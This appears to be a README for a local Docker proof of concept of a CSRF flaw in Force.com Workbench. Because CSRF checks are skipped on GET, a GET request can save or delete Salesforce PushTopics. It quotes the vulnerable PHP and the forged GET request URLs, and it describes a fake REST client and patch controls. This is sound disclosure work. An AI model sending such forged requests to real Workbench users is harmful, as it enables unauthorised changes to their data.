# Standalone PoC for forceworkbench CAND-7fa3da65590e

## Summary

This is a standalone, local-only Docker PoC for the Force.com Workbench / `forceworkbench/forceworkbench` CSRF issue in the Streaming PushTopic DML path.

The root cause is the interaction of two source-code patterns:

```php
// workbench/session.php
if ($_SERVER['REQUEST_METHOD'] != 'GET') {
    validateCsrfToken();
}
```

and:

```php
// workbench/controllers/StreamingController.php
if (isset($_REQUEST['PUSH_TOPIC_DML'])) {
    if ($_REQUEST['PUSH_TOPIC_DML'] == "SAVE") {
        $this->save();
    } else if ($_REQUEST['PUSH_TOPIC_DML'] == "DELETE") {
        $this->delete();
    }
}
```

Because `$_REQUEST` includes query-string parameters, a GET request can carry `PUSH_TOPIC_DML=SAVE` or `PUSH_TOPIC_DML=DELETE`. Because `session.php` skips CSRF validation for GET requests, the state-changing PushTopic action can be dispatched without a CSRF token.

This PoC does **not** contact Salesforce or any external service. It uses a fake REST client that records the REST method and URL that Workbench would have sent.

## Build and run

```bash
docker build -t poc-forceworkbench-csrf .
docker run --rm poc-forceworkbench-csrf
```

## Expected vulnerable result

The PoC sends forged GET requests without `CSRF_TOKEN`:

```text
GET /workbench/streaming.php?PUSH_TOPIC_DML=DELETE&pushTopicDmlForm_Id=0TOCSRFVictimTopic&...
GET /workbench/streaming.php?PUSH_TOPIC_DML=SAVE&pushTopicDmlForm_Id=undefined&...
```

A vulnerable path should show:

- HTTP status `200`
- `csrf_checks: 0`
- a state-changing fake REST call, such as `DELETE /services/data/v65.0/sobjects/PushTopic/0TOCSRFVictimTopic` or `POST /services/data/v65.0/sobjects/PushTopic`

The PoC also runs controls:

- tokenless POST is rejected, proving the bug is specifically the GET bypass
- patched GET DML is rejected with `405`
- patched POST with a valid CSRF token succeeds

Successful output ends with:

```text
VULNERABLE: forceworkbench CAND-7fa3da65590e reproduced successfully.
```
